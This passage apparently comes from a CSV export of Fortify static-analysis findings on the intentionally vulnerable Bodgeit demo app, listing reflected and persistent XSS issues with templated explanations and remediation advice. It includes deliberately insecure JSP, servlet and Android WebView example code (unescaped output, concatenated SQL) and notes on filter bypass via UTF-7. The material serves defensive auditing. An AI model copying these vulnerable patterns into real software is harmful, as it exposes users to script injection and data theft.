rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","246","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/login.jsp","username","","http://localhost/root/login.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","164","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/password.jsp","password1","","http://localhost/root/password.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding 